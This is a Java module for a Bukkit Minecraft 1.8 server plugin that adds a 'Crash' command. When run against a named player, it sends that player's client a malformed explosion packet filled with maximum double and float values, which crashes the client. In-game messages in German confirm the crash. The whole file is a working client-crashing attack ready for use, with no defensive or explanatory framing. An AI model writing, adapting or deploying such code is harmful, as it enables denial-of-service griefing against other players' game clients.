package me.maiko.modules.player.bad;

import java.util.Collections;

import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import me.maiko.main.Main;
import me.maiko.module.Module;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;

public class Crash_Mod extends Module{
	public Crash_Mod() {
		super("Crash");
	}
	
	@SuppressWarnings("unchecked")
	@Override
	public void onCommand(String[] args, Player p) {
		if (args.length == 2) {
			Player t = Bukkit.getPlayer(args[1]);
			if (t.isOnline()) {
				((CraftPlayer) t).getHandle().playerConnection.sendPacket(
						new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE,
								Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));	
				p.sendMessage(Main.Prefix + "Du hast diesen Spieler gecrashed!");

			} else {
				p.sendMessage(Main.Prefix + "Dieser Spieler ist nicht Online!");

			}

		} else {
			p.sendMessage(Main.Prefix + "Nutze _crash <Player>");

		}
}

}
